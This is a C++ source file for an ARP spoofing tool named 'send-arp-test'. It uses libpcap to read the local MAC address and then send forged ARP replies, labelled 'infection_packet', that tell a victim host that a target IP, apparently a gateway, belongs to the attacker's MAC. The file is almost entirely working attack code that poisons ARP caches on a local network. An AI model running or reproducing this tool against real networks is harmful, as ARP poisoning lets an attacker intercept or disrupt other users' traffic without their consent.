#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int GetMacAddress(char *ifname, uint8_t *mac_addr)
{
    struct ifreq ifr;
    int sockfd, ret;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0){
        printf("Fail to get interface MAC address\n");
        return -1;
    }
    strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0){
        printf("Fail to get interface MAC address\n");
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);

    close(sockfd);
    return 0;
}

int main(int argc, char* argv[]) {
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    uint8_t attacker_mac_addr[6];
    GetMacAddress(argv[1], attacker_mac_addr);

    for(int i = 0; i < (argc - 2) / 2; i++){
        EthArpPacket packet;

        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = attacker_mac_addr;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = attacker_mac_addr;
        packet.arp_.sip_ = htonl(Ip(argv[2 * i + 3]));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof (EthArpPacket));
        if(res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));

        while (true) {
            struct pcap_pkthdr* header;
            const u_char* reply_;
            EthArpPacket* reply;

            res = pcap_next_ex(handle, &header, &reply_);
            if (res == 0) continue;
            if (res == -1 or res == -2) {
                fprintf(stderr, "pcap_next_ex error, %s\n", pcap_geterr(handle));
                break;
            }

            reply = (EthArpPacket*)reply_;
            if (reply->eth_.type_ != htons(EthHdr::Arp) or reply->arp_.op_ != htons(ArpHdr::Reply)) continue;

            EthArpPacket infection_packet;
            infection_packet.eth_.dmac_ = reply->arp_.smac_;
            infection_packet.eth_.smac_ = attacker_mac_addr;
            infection_packet.eth_.type_ = htons(EthHdr::Arp);

            infection_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
            infection_packet.arp_.pro_ = htons(EthHdr::Ip4);
            infection_packet.arp_.hln_ = Mac::SIZE;
            infection_packet.arp_.pln_ = Ip::SIZE;
            infection_packet.arp_.op_ = htons(ArpHdr::Reply);
            infection_packet.arp_.smac_ = attacker_mac_addr;
            infection_packet.arp_.sip_ = htonl((Ip(argv[2 * i + 3])));
            infection_packet.arp_.tmac_ = reply->arp_.smac_;
            infection_packet.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
            if (res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));

            break;
        }
    }
	pcap_close(handle);
}
